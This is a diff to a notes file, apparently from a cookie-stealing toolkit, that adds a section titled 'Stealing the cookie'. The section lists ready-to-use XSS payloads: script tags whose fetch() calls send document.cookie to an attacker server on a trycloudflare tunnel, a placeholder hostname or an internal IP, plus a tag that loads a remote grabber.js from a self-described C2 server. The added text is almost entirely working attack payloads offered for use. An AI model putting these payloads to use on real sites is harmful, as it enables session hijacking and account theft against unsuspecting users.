@@ -32,3 +32,19 @@ html/
 
 Alternative attacker server:
 - Flask-server for temporary saving of cookies (see flask_cookie_grabber.py)
+
+<h2>Stealing the cookie</h2>
+<h3>Over web with Flask + https:</h3>
+<script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
+
+<h3>Within the Network with Flask:</h3>
+<script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script>
+<br>
+Example: <br>
+<script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script>
+
+<h3>Within the network with apache "C2"-Server </h3>
+<script src="http://[IP]/cookiegrabber/grabber.js"></script>
+
+
+
